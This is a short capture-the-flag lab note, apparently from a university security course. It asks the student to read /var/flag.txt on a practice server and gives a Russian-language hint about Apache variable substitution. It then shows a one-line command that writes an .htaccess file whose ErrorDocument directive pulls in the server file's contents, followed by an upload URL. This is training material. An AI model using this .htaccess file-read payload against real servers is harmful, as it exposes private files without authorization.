## 5) Hard - http://hard.tasks.prak.seclab.cs.msu.ru  

You should read the flag located in `/var/flag.txt`.  
Note that service automatically restarts from scratch every 15 minutes.  

документации Apache — в руководстве по модулю mod_include или mod_rewrite встречаются примеры использования `%{...} `для подстановки переменных окружения, а `file://` — это URI, который Apache иногда может обработать в контексте ErrorDocument  

echo `'ErrorDocument 404 "%{file:///var/flag.txt}"' > test.htaccess ` 

http://hard.tasks.prak.seclab.cs.msu.ru/uploads/69c168f1230a4/123  
